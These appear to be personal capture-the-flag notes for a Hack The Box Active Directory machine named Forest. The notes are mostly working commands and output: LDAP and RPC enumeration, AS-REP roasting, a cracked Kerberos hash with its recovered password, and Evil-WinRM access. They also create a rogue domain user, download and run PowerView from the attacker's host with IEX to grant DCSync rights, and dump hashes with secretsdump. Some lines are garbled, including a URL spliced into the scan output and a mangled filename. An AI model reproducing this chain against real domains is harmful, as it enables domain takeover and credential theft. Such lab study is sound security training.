###############
Forest
Medium Level
RPC Enum:
    https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
LDAP Enum:
    https://medium.com/@gokulg.me/introduction-92199491c808

CrackMapExec:
    https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials

HashCat m 18200:  Kerberos 5, etype 23, AS-REP

svc-alfresco is memeber for Account Operator which allows to create new user

###############

1-Enummeration:
    └─$ nmap -T2 -sV -sC -Pn 10.129.95.210 -v
        PORT     STATE SERVICE      VERSION
        53/tcp   open  domain       Simple DNS Plus
        88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-14 21:56:04Z)
        135/tcp  open  msrpc        Microsoft Windows RPC
        139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
        389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
        464/tcp  open  kpasswd5?
        593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
        636/tcp  open  tcpwrapped
        3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        3269/tcp open  tcpwrapped
        Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows


        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        9389/tcp  open     mc-nmf       .NET Message Framing
        10760/tcp filtered unknown
        47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-title: Not Found
        |_http-server-header: Microsoft-HTTPAPI/2.0
        49664/tcp open     msrpc        Microsoft Windows RPC
        49665/tcp open     msrpc        Microsoft Windows RPC
        49666/tcp open     msrpc        Microsoft Windows RPC
        49668/tcp open     msrpc        Microsoft Windows RPC
        49670/tcp open     msrpc        Microsoft Windows RPC
        49680/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
        49681/tcp open     msrpc        Microsoft Windows RPC
        49684/tcp open     msrpc        Microsoft Windows RPC
        49697/tcp open     msrpc        Microsoft Windows RPC
        Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled and required <<<<<<------- OH NOOOOOOOOWWWWWWWWWWWWWWWWWWWW
        | smb-security-mode: 
        |   account_used: <blank>
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: required
        | smb2-time: 
        |   date: 2025-10-14T21:58:05
        |_  start_date: 2025-10-14T21:54:36
        |_clock-skew: mean: 2h26m51s, deviation: 4h02m29s, median: 6m50s
        | smb-os-discovery: 
        |   OS: Windows Server 2016 Stanhttps://medium.com/@gokulg.me/introduction-92199491c808dard 14393 (Windows Server 2016 Standard 6.3) <<<<<<------- Win Version 6.3
        |   Computer name: FOREST
        |   NetBIOS computer name: FOREST\x00
        |   Domain name: htb.local <<<<<<------- Domain Name
        |   Forest name: htb.local
        |   FQDN: FOREST.htb.local
        |_  System time: 2025-10-14T14:58:03-07:00


    # Port 135 RCP - https://www.hackingarticles.in/active-directory-enumeration-rpcclient/:
        Try RPC connection:
            rpcclient -U "" -N 10.129.95.210
                rpcclient $> enumdomusers
                    user:[Administrator] rid:[0x1f4]
                    user:[Guest] rid:[0x1f5]
                    user:[krbtgt] rid:[0x1f6]
                    user:[DefaultAccount] rid:[0x1f7]
                    user:[sebastien] rid:[0x479]
                    user:[lucinda] rid:[0x47a]
                    user:[svc-alfresco] rid:[0x47b]
                    user:[andy] rid:[0x47e]
                    user:[mark] rid:[0x47f]
                    user:[santi] rid:[0x480]

                rpcclient $> enumdomgroups
                    group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
                    group:[Domain Admins] rid:[0x200]
                    group:[Domain Users] rid:[0x201]
                    group:[Domain Guests] rid:[0x202]
                    group:[Domain Computers] rid:[0x203]
                    group:[Domain Controllers] rid:[0x204]
                    group:[Schema Admins] rid:[0x206]
                    group:[Enterprise Admins] rid:[0x207]
                    group:[Group Policy Creator Owners] rid:[0x208]
                    group:[Read-only Domain Controllers] rid:[0x209]
                    group:[Cloneable Domain Controllers] rid:[0x20a]
                    group:[Protected Users] rid:[0x20d]
                    group:[Key Admins] rid:[0x20e]
                    group:[Enterprise Key Admins] rid:[0x20f]
                    group:[DnsUpdateProxy] rid:[0x44e]
                    group:[Organization Management] rid:[0x450]
                    group:[Recipient Management] rid:[0x451]
                    group:[View-Only Organization Management] rid:[0x452]
                    group:[Public Folder Management] rid:[0x453]
                    group:[UM Management] rid:[0x454]
                    group:[Help Desk] rid:[0x455]
                    group:[Records Management] rid:[0x456]
                    group:[Discovery Management] rid:[0x457]
                    group:[Server Management] rid:[0x458]
                    group:[Delegated Setup] rid:[0x459]
                    group:[Hygiene Management] rid:[0x45a]
                    group:[Compliance Management] rid:[0x45b]
                    group:[Security Reader] rid:[0x45c]
                    group:[Security Administrator] rid:[0x45d]
                    group:[Exchange Servers] rid:[0x45e]
                    group:[Exchange Trusted Subsystem] rid:[0x45f]
                    group:[Managed Availability Servers] rid:[0x460]
                    group:[Exchange Windows Permissions] rid:[0x461]
                    group:[ExchangeLegacyInterop] rid:[0x462]
                    group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
                    group:[Service Accounts] rid:[0x47c]
                    group:[Privileged IT Accounts] rid:[0x47d]
                    group:[test] rid:[0x13ed]
            
            rpcclient $> querydominfo
                Domain:		HTB
                Server:		
                Comment:	
                Total Users:	105

            rpcclient $> querygroup 0x200 (using the RID)
                Group Name:	Domain Admins
                Description:	Designated administrators of the domain
                Group Attribute:7
                Num Members:1

            rpcclient $> queryuser svc-alfresco
                user_rid :	0x47b
                group_rid:	0x201
                acb_info :	0x00010210
                fields_present:	0x00ffffff
                logon_divs:	168
                bad_password_count:	0x00000000
                logon_count:	0x00000006

            rpcclient $> getdompwinfo
                min_password_length: 7
                password_properties: 0x00000000


    

    # Port 445 SMB:
        # enumera shares (anonymous)
            smbclient -L //10.129.95.210 -N     
                Anonymous login successful

                Sharename       Type      Comment
                ---------       ----      -------
                Reconnecting with SMB1 for workgroup listing.
                do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
                Unable to connect with SMB1 -- no workgroup available

        # or with account
            smbclient -L //10.129.95.210 -U 'FOREST\\USER' 
                Nothing here too


    # Port 636/389 Enumerateldaps - https://medium.com/@gokulg.me/introduction-92199491c808: 
        ldapsearch -x -h 10.129.95.210 -s base
       
        # Querying LDAP Anonymously - If anonymous access is allowed, you can pull domain details:
        ldapsearch -h 10.129.95.210 -x -s base namingContexts
            dn:
                namingContexts: DC=htb,DC=local
                namingContexts: CN=Configuration,DC=htb,DC=local
                namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
                namingContexts: DC=DomainDnsZones,DC=htb,DC=local
                namingContexts: DC=ForestDnsZones,DC=htb,DC=local

                *-LLL: LDIF output without comments.
                -x: simple bind (anonymous).
                -H ldap://IP: LDAP server.
                -b “” -s base: base search on RootDSE.
                namingContexts: attribute containing the DNs of the domain(s) (e.g., dc=htb,dc=local).

        # Extracting Users from LDAP
        ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb, DC=local" "(objectClass=person)" cn
            # Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
            htb.local
            dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
            =Employees,DC=htb,DC=local
            cn: Sebastien Caron

        We have our users list:
            └──╼ [★]$ cat users.txt
                svc-alfresco
                sebastien
                lucinda
                svc-alfresco
                andy
                mark
                santi

        We can try to Passwd Spray - https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials:
            crackmapexec smb 10.129.95.210 -u usernusers.txeame -p modified_password.txt --ignore-pw-decoding


        We can also try:
            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.129.95.210 htb.local/svc-alfresco -no-pass

            Runs Impacket’s GetNPUsers.py against the domain controller at 10.129.95.210.
            -no-pass tells the script you don’t have the account password (attempts anonymous/no-preauth request).

            The script requests AS-REP responses for accounts that have Kerberos pre-authentication disabled.
            For vulnerable accounts the DC returns an AS-REP blob (format $krb5asrep$...), which the script saves/prints.

            We get the TGT:
                [*] Getting TGT for svc-alfresco
                    $krb5asrep$23$svc-alfresco@HTB.LOCAL:457244551e22e2779b6ddb622f720fc5$c44f49a353a37a1a1105b76be6ead2f7bdbabe1fe9bad30bdfc70737fc7cbd0276c91d27ddd1acbf6a98091825af032e24d31642e6faa4473f77ad8c689f4f2b5c0358188fdd6d61944f41ca68fa624902560ba17ae6a5dad9fdb9bb21a1de31342a001b1fe2fc59a03877cb10ae73c8e27727d173be150cac198f808968c15cd736f4ac73dd5b901970c8cea90fafabf8bd0bed4e3c70b228539a6d8ee85a4e495fea31c6ece4ec156b829f3e8caa7f13d3ea8af0196c653efb468a0de382253fc0a42201cf842deae46b3fd4135a934eeb057d56191f1cd97e475ba3e7de3c260ca9e0e845

        Next Step:
            Crack offline with John/hashcat to recover the account password (no noisy online brute force against the DC).

            We can use the hashcat -m 18200 = Kerberos 5, etype 23, AS-REP
        Cracking the Hashes in KALI:
            hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

            $krb5asrep$23$svc-alfresco@HTB.LOCAL:457244551e22e2779b6ddb622f720fc5$c44f49a353a37a1a1105b76be6ead2f7bdbabe1fe9bad30bdfc70737fc7cbd0276c91d27ddd1acbf6a98091825af032e24d31642e6faa4473f77ad8c689f4f2b5c0358188fdd6d61944f41ca68fa624902560ba17ae6a5dad9fdb9bb21a1de31342a001b1fe2fc59a03877cb10ae73c8e27727d173be150cac198f808968c15cd736f4ac73dd5b901970c8cea90fafabf8bd0bed4e3c70b228539a6d8ee85a4e495fea31c6ece4ec156b829f3e8caa7f13d3ea8af0196c653efb468a0de382253fc0a42201cf842deae46b3fd4135a934eeb057d56191f1cd97e475ba3e7de3c260ca9e0e845:s3rvice

            login: alfresco@HTB.LOCAL
            passwd: s3rvice


        └──╼ [★]$ crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice --shares
            SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
            SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
            SMB         10.129.95.210   445    FOREST           [*] Enumerated shares
            SMB         10.129.95.210   445    FOREST           Share           Permissions     Remark
            SMB         10.129.95.210   445    FOREST           -----           -----------     ------
            SMB         10.129.95.210   445    FOREST           ADMIN$                          Remote Admin
            SMB         10.129.95.210   445    FOREST           C$                              Default share
            SMB         10.129.95.210   445    FOREST           IPC$                            Remote IPC
            SMB         10.129.95.210   445    FOREST           NETLOGON        READ            Logon server share 
            SMB         10.129.95.210   445    FOREST           SYSVOL          READ            Logon server share 


        ldapdomaindump -u 'alfresco@HTB.LOCAL' -p 's3rvice' ldap://10.129.95.210

        

2-Priv Esc:
    We Have acces to a Windows PC via svc alfresoc and evilwin RM:
        evil-winrm -u svc-alfresco -p s3rvice -i 10.129.95.210

    Win Enum:
        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>  whoami /priv

            PRIVILEGES INFORMATION
            ----------------------

            Privilege Name                Description                    State
            ============================= ============================== =======
            SeMachineAccountPrivilege     Add workstations to domain     Enabled
            SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
            SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup
            Aliases for \\FOREST
                -------------------------------------------------------------------------------
                *Access Control Assistance Operators
                *Account Operators
                *Administrators
                *Allowed RODC Password Replication Group
                *Backup Operators
                *Cert Publishers
                *Certificate Service DCOM Access
                *Cryptographic Operators
                *Denied RODC Password Replication Group
                *Distributed COM Users
                *DnsAdmins
                *Event Log Readers
                *Guests
                *Hyper-V Administrators
                *IIS_IUSRS
                *Incoming Forest Trust Builders
                *Network Configuration Operators
                *Performance Log Users
                *Performance Monitor Users
                *Pre-Windows 2000 Compatible Access
                *Print Operators
                *RAS and IAS Servers
                *RDS Endpoint Servers
                *RDS Management Servers
                *RDS Remote Access Servers
                *Remote Desktop Users
                *Remote Management Users
                *Replicator
                *Server Operators
                *Storage Replica Administrators
                *System Managed Accounts Group
                *Terminal Server License Servers
                *Users
                *Windows Authorization Access Group


        Anything interesting in Credential Manager?
        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cmdkey /list

            Currently stored credentials:
            * NONE *


        We will use SMB Server from Kali to Windows Machine in order to upload WinPEAS64:
            USE OF: winPEAS_Upload_Steps.sh for the setup
            From Windows Machine:
                *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy \\10.10.15.69\share\winPEASx64.exe C:\Users\svc-alfresco\Desktop\winPEASx64.exe


        svc-alfresco is memeber for Account Operator which allows to create new user:

            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user adib adib1234 /add /domain
                The command completed successfully.


        Verify how is memeber of Exchange Windows:
            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions"
                    Group name     Exchange Windows Permissions
                    Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

                    Members

                    -------------------------------------------------------------------------------
                    The command completed successfully.
        

        No Memeber we will add adib:
            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" /add adib
                The command completed successfully.


        We use PowerView.PS1 to force Creation of adib account in the domain with the Right of DCSync:
            Kali web server:
                └──╼ [★]$ python3 -m http.server 8080
                            Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

            Win Machine:
                *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.15.69:8080/powerview.ps1')
                    $pass= convertto-securestring 'adib1234' -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential('HTB\adib', $pass)
                    Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity adib -Rights DCSync

        Now lets use secretsdump.py:
            ./secretsdump.py htb.local/adib:adib1234@10.10.15.69

        We have dump the hashes for admin account











